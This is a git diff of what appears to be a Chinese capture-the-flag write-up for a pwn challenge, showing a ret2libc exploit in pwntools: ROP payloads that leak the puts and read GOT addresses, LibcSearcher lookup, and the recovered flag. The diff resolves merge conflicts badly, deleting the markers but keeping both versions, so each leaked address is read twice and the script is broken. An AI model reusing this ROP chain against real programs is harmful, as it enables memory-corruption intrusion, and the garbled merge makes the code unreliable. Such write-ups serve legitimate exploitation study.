@@ -1441,21 +1441,20 @@ payload = cyclic(0x100)
 payload += p64(0xdeadbeef)
 payload += p64(pop_rdi_ret_elf_addr) + p64(puts_got_elf_addr) + p64(ret_elf_addr) + p64(puts_plt_elf_addr) + p64(main_elf_addr)
 r.sendafter(":\n".encode(), payload)
-<<<<<<< HEAD
+
 puts_got_libc_addr = u64(r.recvuntil('\x7f'.encode())[-6:].ljust(8, '\x00'.encode()))
-=======
+
 puts_got_libc_addr = u64(r.recv(6).ljust(8, '\x00'.encode()))
->>>>>>> origin/master
 
 payload = cyclic(0x100)
 payload += p64(0xdeadbeef)
 payload += p64(pop_rdi_ret_elf_addr) + p64(read_got_elf_addr) + p64(ret_elf_addr) + p64(puts_plt_elf_addr) + p64(main_elf_addr)
 r.sendafter(":\n".encode(), payload)
-<<<<<<< HEAD
+
 read_got_libc_addr = u64(r.recvuntil('\x7f'.encode())[-6:].ljust(8, '\x00'.encode()))
-=======
+
 read_got_libc_addr = u64(r.recv(6).ljust(8, '\x00'.encode()))
->>>>>>> origin/master
+
 
 libc = LibcSearcher("puts", puts_got_libc_addr)
 libc.add_condition("read", read_got_libc_addr)
@@ -1510,7 +1509,7 @@ cat flag
 nssctf{L3ak_L1bc_to_g3t_addr3ss_and_ret2_system_b1n5h}
 ```
 
-<<<<<<< HEAD
+
 **得到：nssctf{L3ak_L1bc_to_g3t_addr3ss_and_ret2_system_b1n5h}**
 
 
